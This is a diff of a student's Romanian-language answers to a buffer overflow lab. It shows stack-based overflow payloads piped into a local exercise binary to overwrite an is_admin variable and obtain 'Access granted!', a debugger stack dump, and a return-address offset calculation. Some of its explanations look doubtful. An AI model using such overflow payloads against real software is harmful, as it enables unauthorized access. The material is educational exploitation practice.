@@ -1,3 +1,4 @@
+// un qword are 8 octeti dword are 4 octeti word are 2 
 Q1: Putem folosi buffer overflow pentru a accesa alte zone de memorie si putem modifica alte variabile
 Q2: Deoarece in stack variabilele is_admin si password sunt una langa alta pe stiva, doar daca facem buffer 
 overflow cu un octet in plus is_admin primeste alta valoare deci punem orice sir de caractere mai mare de 8 
@@ -8,11 +9,15 @@ pwndbg> x/10gx $rsp
 0x7fffffffd8a0: 0x00007fffffffd990      0x0000000000401146
 0x7fffffffd8b0: 0x0000000100400040      0x00007fffffffd9a8
 0x7fffffffd8c0: 0x00007fffffffd9a8      0xf0efe9662f5e2f73
-Se observa ca aparare dupa 8 octeti normal mai exista inca un octet in celalalt qword 
+Se observa ca apare dupa 8 octeti normali (adadadad) mai exista inca un octet in celalalt qword 
 
 Q4:
 Pentru ex 2 variabila is_admin este long adica pe 8 octeti deci payloadul va fi 8 de A pentru parola si \xef\xbe\xad\xde\x00\x00\x00\x00 pentru is_admin
  echo '\x41\x41\x41\x41\x41\x41\x41\x41\xef\xbe\xad\xde\x00\x00\x00\x00' | ./bin/ex2 
+ Am observat ca strcmp ul verfica doar primii 4 octeti deci iau granted acces si asa 
+  echo '\x11\x22\x33\x44\x55\x66\x77\x88\xef\xbe\xad\xde' | ./bin/ex2  
+Access granted!
 
- Q5: 
- Offsetul are 256 cat este buffer ul si inca 8 pentru valoarea anterioara a base pointerului salvata anterior
+ Q5: Am cautat adresa buffer-lui si am scazut cu adresa rip care este [rbp-8]
+ pentru ca inainte sa se salveze base pointerul se salveaza instr point.
+Rezulta 48
